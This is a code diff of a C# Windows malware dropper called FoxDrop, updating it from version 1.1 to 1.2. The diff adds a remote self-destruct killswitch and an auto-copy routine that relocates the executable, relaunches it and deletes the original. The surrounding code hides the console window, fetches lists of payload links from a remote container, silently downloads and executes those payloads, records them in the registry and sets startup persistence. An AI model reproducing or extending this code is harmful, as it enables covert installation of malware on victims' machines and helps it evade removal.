@@ -1,6 +1,8 @@
 ﻿using Microsoft.Win32;
+using SysAudioManager;
 using System;
 using System.Diagnostics;
+using System.IO;
 using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
@@ -110,6 +112,12 @@ namespace FoxDrop
                         payloadDownloadLink = new WebClient().DownloadString(Variables.BEACON_DOWNLOAD_CONTAINER_URL_FALLBACK);
                     }
 
+                    if (payloadDownloadLink.Contains(Variables.BEACON_DOWNLOAD_CONTAINER_SELFDESTRUCT_KILLSWITCH))
+                    {
+                        Variables.debugLog($"[*] Self-Destruct value found, self-deleting now...");
+                        Destruct.selfDestruct();
+                    }
+
                     // Get every payload download link individually.
                     string[] payloadLinks = payloadDownloadLink.Split(new char[] { '\n' });
 
@@ -133,7 +141,7 @@ namespace FoxDrop
                         string payloadListMD5 = c.GetValue(Variables.beaconKeyName).ToString();
 
                         // Check if payload was not already executed in the system before.
-                        if (!payloadListMD5.Contains(Hashing.CalculateMD5(LinkAndFileName.Split(';')[0])))
+                        if (!payloadListMD5.Contains(HashingAndCipher.CalculateMD5(LinkAndFileName.Split(';')[0])))
                         {
                             // Tries to download and execute the payload, silently, regardless of success or not.
                             try
@@ -163,7 +171,7 @@ namespace FoxDrop
                                 Process.Start(LinkAndFileName.Split(';')[1]);
                                 Variables.debugLog($"[*] Payload started from {LinkAndFileName.Split(';')[1]}");
 
-                                c.SetValue(Variables.beaconKeyName, payloadListMD5 + "\n" + Hashing.CalculateMD5(LinkAndFileName.Split(';')[0]));
+                                c.SetValue(Variables.beaconKeyName, payloadListMD5 + "\n" + HashingAndCipher.CalculateMD5(LinkAndFileName.Split(';')[0]));
                                 Variables.debugLog($"[*] Payload hash (md5) added to list to prevent re-execution.");
                             }
                             catch { }
@@ -191,7 +199,7 @@ namespace FoxDrop
             //     /_/    \____/_/|_/_____/_/   \____/ .___/       //
             //      by Luigi Fiore aka lypd0        /_/            //
             //                                                     //
-            //             New-Gen Payload Dropper 1.1             //
+            //             New-Gen Payload Dropper 1.2             //
             //                 for Windows Systems                 //
             //                                                     //
             /////////////////////////////////////////////////////////
@@ -208,6 +216,42 @@ namespace FoxDrop
 
             if (!Variables.DEBUG_VIEW)
                 ShowWindow(handle, SW_HIDE);
+
+            // Check for auto-copy
+            if (Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName) == Variables.FIRST_EXECUTION_AUTOCOPY_PATH)
+            {
+                Variables.FIRST_EXECUTION_AUTOCOPY = false;
+            }
+
+            if (Variables.FIRST_EXECUTION_AUTOCOPY)
+            {
+                try
+                {
+                    Variables.debugLog("[*] Auto-copy is enabled, autocopying ...");
+                    if (!Directory.Exists(Variables.FIRST_EXECUTION_AUTOCOPY_PATH))
+                        Directory.CreateDirectory(Variables.FIRST_EXECUTION_AUTOCOPY_PATH);
+
+                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(Variables.FIRST_EXECUTION_AUTOCOPY_PATH, Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName)), true);
+                    Variables.debugLog("[*] File auto-copied to " + Variables.FIRST_EXECUTION_AUTOCOPY_PATH);
+
+                    Variables.debugLog("[*] Executing in new location...");
+                    Process.Start(Path.Combine(Variables.FIRST_EXECUTION_AUTOCOPY_PATH, Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName)));
+                    Variables.debugLog("[*] Copy executed.");
+
+                    if (Variables.DEBUG_VIEW)
+                    {
+                        Variables.debugLog("[*] (Debug-only) waiting 5000ms ...");
+                        Thread.Sleep(5000);
+                    }
+                }
+                catch
+                {
+                    Variables.debugLog("[*] Auto-copy failed, defaulting to normal execution.");
+                    Variables.FIRST_EXECUTION_AUTOCOPY = false;
+                }
+
+                if(Variables.FIRST_EXECUTION_AUTOCOPY) Destruct.selfDelete();
+            }
 
             // Setup Persistance
             SetStartup();
